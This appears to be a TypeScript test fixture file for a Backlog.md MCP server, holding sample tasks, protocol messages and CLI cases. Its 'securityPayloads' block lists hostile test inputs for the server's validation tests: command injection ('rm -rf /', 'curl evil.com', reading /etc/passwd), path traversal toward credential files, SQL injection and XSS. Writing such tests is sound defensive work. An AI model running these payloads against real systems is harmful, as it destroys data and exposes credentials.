/**
 * Test fixtures for Backlog.md MCP Server tests
 */

import * as path from 'path';
import * as os from 'os';


/**
 * Sample task data
 */
export const sampleTasks = [
	{
		id: 'task-1',
		title: 'Implement user authentication',
		description: 'Add login and signup functionality',
		status: 'todo',
		priority: 'high',
		tags: ['feature', 'auth']
	},
	{
		id: 'task-2',
		title: 'Fix navigation bug',
		description: 'Navigation menu not closing on mobile',
		status: 'in-progress',
		priority: 'urgent',
		tags: ['bug', 'mobile']
	},
	{
		id: 'task-3',
		title: 'Update documentation',
		description: 'Add API documentation',
		status: 'done',
		priority: 'medium',
		tags: ['docs']
	},
	{
		id: 'task-4',
		title: 'Database migration',
		description: 'Waiting for approval',
		status: 'blocked',
		priority: 'high',
		tags: ['backend', 'database']
	}
];

/**
 * Sample sprint data
 */
export const sampleSprint = {
	id: 'sprint-1',
	name: 'Sprint 1 - Core Features',
	goal: 'Complete authentication and basic UI',
	startDate: '2024-01-01',
	endDate: '2024-01-14',
	tasks: ['task-1', 'task-2', 'task-3']
};

/**
 * Platform-specific paths
 */
export const platformPaths = {
	darwin: {
		npmGlobal: '/usr/local/lib/node_modules',
		executable: '/usr/local/bin/backlog-mcp'
	},
	win32: {
		npmGlobal: path.join(process.env.APPDATA || '', 'npm', 'node_modules'),
		executable: path.join(process.env.APPDATA || '', 'npm', 'backlog-mcp.cmd')
	},
	linux: {
		npmGlobal: '/usr/lib/node_modules',
		executable: '/usr/bin/backlog-mcp'
	}
};

/**
 * MCP protocol test messages
 */
export const mcpMessages = {
	// Tool listing request
	listToolsRequest: {
		jsonrpc: '2.0',
		id: 1,
		method: 'tools/list',
		params: {}
	},
	
	// Resource listing request
	listResourcesRequest: {
		jsonrpc: '2.0',
		id: 2,
		method: 'resources/list',
		params: {}
	},
	
	// Tool call request
	callToolRequest: (tool: string, args: any) => ({
		jsonrpc: '2.0',
		id: 3,
		method: 'tools/call',
		params: {
			name: tool,
			arguments: args
		}
	}),
	
	// Resource read request
	readResourceRequest: (uri: string) => ({
		jsonrpc: '2.0',
		id: 4,
		method: 'resources/read',
		params: { uri }
	}),
	
	// Expected responses
	toolsListResponse: {
		jsonrpc: '2.0',
		id: 1,
		result: {
			tools: [
				'task_create',
				'task_list',
				'task_edit',
				'task_move',
				'task_delete',
				'board_show',
				'sprint_create',
				'sprint_current',
				'config_get',
				'config_set'
			].map(name => ({ name }))
		}
	},
	
	resourcesListResponse: {
		jsonrpc: '2.0',
		id: 2,
		result: {
			resources: [
				{ uri: 'backlog://tasks/all', name: 'All Tasks' },
				{ uri: 'backlog://board', name: 'Kanban Board' },
				{ uri: 'backlog://config', name: 'Configuration' },
				{ uri: 'backlog://sprint/current', name: 'Current Sprint' }
			]
		}
	}
};

/**
 * CLI command test cases
 */
export const cliTestCases = {
	help: {
		command: ['--help'],
		expectedOutput: ['Backlog.md MCP Server', 'Commands:', 'start', 'validate']
	},
	
	version: {
		command: ['--version'],
		expectedOutput: ['1.0.0']
	},
	
	invalidCommand: {
		command: ['invalid'],
		expectedError: 'Unknown command'
	},
	
	startStdio: {
		command: ['start', '--transport', 'stdio'],
		expectedBehavior: 'Starts server in STDIO mode'
	},
	
	startHttp: {
		command: ['start', '--transport', 'http', '--port', '3000'],
		expectedOutput: ['MCP server running on http://localhost:3000']
	}
};

/**
 * Security test payloads
 */
export const securityPayloads = {
	commandInjection: [
		'task-1; rm -rf /',
		'task-1 && cat /etc/passwd',
		'task-1 | curl evil.com',
		'`rm -rf /`',
		'$(cat /etc/passwd)'
	],
	
	pathTraversal: [
		'../../../etc/passwd',
		'..\\..\\..\\windows\\system32\\config\\sam',
		'file:///etc/passwd',
		'\\\\server\\share\\file'
	],
	
	sqlInjection: [
		"'; DROP TABLE tasks; --",
		"1' OR '1'='1",
		"admin'--",
		"1; DELETE FROM tasks WHERE 1=1"
	],
	
	xss: [
		'<script>alert("XSS")</script>',
		'javascript:alert("XSS")',
		'<img src=x onerror=alert("XSS")>',
		'<svg onload=alert("XSS")>'
	]
};

/**
 * Performance test thresholds
 */
export const performanceThresholds = {
	serverStartup: 1000, // 1 second
	toolExecution: 500, // 500ms
	resourceRead: 200, // 200ms
	configOperation: 100, // 100ms
	memoryUsage: 100 * 1024 * 1024 // 100MB
};

/**
 * Test environment configurations
 */
export const testEnvironments = {
	ci: {
		NODE_ENV: 'test',
		CI: 'true',
		BACKLOG_MCP_TELEMETRY: 'false'
	},
	
	local: {
		NODE_ENV: 'development',
		DEBUG: 'backlog-mcp:*'
	},
	
	production: {
		NODE_ENV: 'production',
		npm_config_global: 'true'
	}
};

/**
 * Error scenarios
 */
export const errorScenarios = {
	
	permissionDenied: {
		error: 'EACCES: permission denied',
		solution: 'Run with appropriate permissions or check file ownership'
	},
	
	backlogNotFound: {
		error: 'Backlog.md CLI not found',
		solution: 'Install backlog.md globally: npm i -g backlog.md'
	},
	
	portInUse: {
		error: 'EADDRINUSE: address already in use',
		solution: 'Choose a different port or stop the conflicting process'
	},
	
	invalidConfig: {
		error: 'Invalid configuration file',
		solution: 'Check your local MCP configuration'
	}
};